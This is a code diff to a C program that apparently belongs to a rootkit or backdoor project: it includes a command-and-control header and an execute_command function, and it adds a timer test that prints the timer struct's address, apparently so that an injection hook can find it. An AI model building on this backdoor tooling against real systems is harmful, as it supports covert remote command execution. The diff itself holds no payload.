@@ -16,9 +16,34 @@
 #include <netinet/ip.h>
 #include <netinet/tcp.h>
 #include <dlfcn.h>
+#include <sys/timerfd.h>
 
 #include "lib/RawTCP.h"
 #include "../common/c&c.h"
+
+
+int test_time_values_injection(){
+
+    struct itimerspec new_value;
+    int max_exp, fd;
+    struct timespec now;
+    uint64_t exp, tot_exp;
+    ssize_t s;
+    
+    fd = timerfd_create(CLOCK_REALTIME, 0);
+    if (fd == -1)
+        return -1;
+
+    new_value.it_interval.tv_sec = 30;
+    new_value.it_interval.tv_nsec = 0;
+
+    if (timerfd_settime(fd, TFD_TIMER_ABSTIME, &new_value, NULL) == -1)
+        return -1;
+        
+    printf("Timer %i started, address sent %llx\n", fd, (__u64)&new_value);
+
+    return 0;
+}
 
 
 char* execute_command(char* command){
@@ -72,6 +97,8 @@ int main(int argc, char* argv[], char *envp[]){
         printf("Argument %i is %s\n", ii, argv[ii]);
     }
     
+    test_time_values_injection();
+
     time_t rawtime;
     struct tm * timeinfo;
 
